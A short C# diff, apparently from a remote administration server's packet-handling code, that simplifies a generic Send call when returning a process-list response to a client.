@@ -27,7 +27,7 @@ namespace xServer.Core.Packets.ClientPackets
 
         public void Execute(Client client)
         {
-            client.Send<GetProcessesResponse>(this);
+            client.Send(this);
         }
     }
 }
